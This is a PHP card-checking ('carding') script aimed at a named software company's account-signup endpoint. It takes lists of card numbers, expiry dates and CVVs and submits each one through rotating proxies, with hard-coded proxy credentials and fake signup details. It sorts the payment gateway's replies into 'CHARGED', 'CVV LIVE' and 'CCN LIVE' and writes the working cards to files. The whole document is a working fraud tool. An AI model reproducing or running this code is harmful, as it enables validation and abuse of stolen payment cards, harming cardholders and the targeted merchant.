
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://www.mertzcrew.com/pricing" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Proxy]/////////////
$rp1 = array(
  1 => 'lcQrwIr4:wUYKA54O',
  2 => 'lcQrwIr4:wUYKA54O',
  3 => 'lcQrwIr4:wUYKA54O',
  4 => 'lcQrwIr4:wUYKA54O',
  5 => 'lcQrwIr4:wUYKA54O',
  6 => 'lcQrwIr4:wUYKA54O',
  7 => 'lcQrwIr4:wUYKA54O',
  8 => 'lcQrwIr4:wUYKA54O',
  9 => 'lcQrwIr4:wUYKA54O',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'de.pro.stellaproxies.com:6824',
  2 => 'uk.pro.stellaproxies.com:5585',
  3 => 'fr.pro.stellaproxies.com:7707',
  4 => 'nl.pro.stellaproxies.com:8049',
  5 => 'turkey.pro.stellaproxies.com:9130',
  6 => 'no.pro.stellaproxies.com:10354',
  7 => 'us.pro.stellaproxies.com:5042',
  8 => 'walmart.pro.stellaproxies.com:6481',
  9 => 'ca.pro.stellaproxies.com:7496',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "🟢";
}
if (empty($ip1)){
$ip = "🔴";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://app.mertzcrew.com/api/create_account/');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.mertzcrew.com',
'referer: https://www.mertzcrew.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'full_name=BILAT+BAHO&email_address=albertmakabugto%40gmail.com&phone_number=6315538583&company_name=Secret&company_address=Ambot+Asa&company_address2=&company_city=Basta&company_state_province=Aklan&company_country=PH&company_zipcode=1101&credit_card_name=BILAT+BAHO&credit_card_number='.$cc.'&credit_card_exp_month='.$mes.'&credit_card_exp_year='.$ano.'&credit_card_cvv='.$cvv.'&credit_card_zipcode=10010&plan_id=pro-monthly&promo_code=&duplicate_subdomain_notify=false');




$result2 = curl_exec($ch);



# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅soilman☯_'.$ip.' </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista Charge"); exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅soilman☯_'.$ip.'  </span><br>';
 fwrite(fopen('insuf', 'a'), "$lista insuf\n");
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅soilman☯_'.$ip.'  </span><br>';
    fwrite(fopen('CVV', 'a'), "$lista cvv pass\n");
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅soilman☯_'.$ip.'  </span><br>';
    fwrite(fopen('bahala.txt', 'a'), "$lista insuf\n");
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅soilman☯_'.$ip.'  </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista ccn\n");
    exit;
    }
    elseif(strpos($result2, "Error updating default payment method. Your card's security code is incorrect.")) {

        echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅soilman☯_'.$ip.'  </span><br>';
        fwrite(fopen('Charge.txt', 'a'), "$lista ccn\n");
        exit;
        }
    elseif(strpos($result2, "Your card's security code is incorrect")) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅soilman☯_'.$ip.'  </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista ccn\n");
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅soilman☯_'.$ip.'   </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ☯_'.$ip.'  </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ☯_'.$ip.' </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ☯_'.$ip.' </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ☯_'.$ip.' </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ ☯_'.$ip.' </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline ☯_'.$ip.' </span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline ☯_'.$ip.' </span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅soilman☯_'.$ip.'  </span><br>';
    fwrite(fopen('bahala.txt', 'a'), "$lista cvv pass\n");
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅soilman☯_'.$ip.' </span><br>';
    fwrite(fopen('bahala.txt', 'a'), "$lista confirm\n");
exit;
}

elseif(strpos($result2, "Thank for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅soilman☯_'.$ip.' </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista Charge\n"); exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅soilman☯_'.$ip.' </span><br>';
fwrite(fopen('Charge.txt', 'a'), "$lista Charge\n"); exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅soilman☯_'.$ip.' </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista Charge\n"); exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅soilman☯_'.$ip.' </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista Charge\n"); exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅soilman☯_'.$ip.' </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista Charge\n"); exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅soilman☯_'.$ip.'   </span><br>';
    fwrite(fopen('Charge.txt', 'a'), "$lista ccn\n");
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅soilman☯_'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅soilman☯_'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅soilman☯_'.$ip.' </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ☯_'.$ip.' </span><br>';
}

echo $result2;

curl_close($ch);
ob_flush();
echo "</i><font size=2 color='grey'>$ip: $ip1</i></font><br>";
#echo $result1;
#echo $result2; 
?>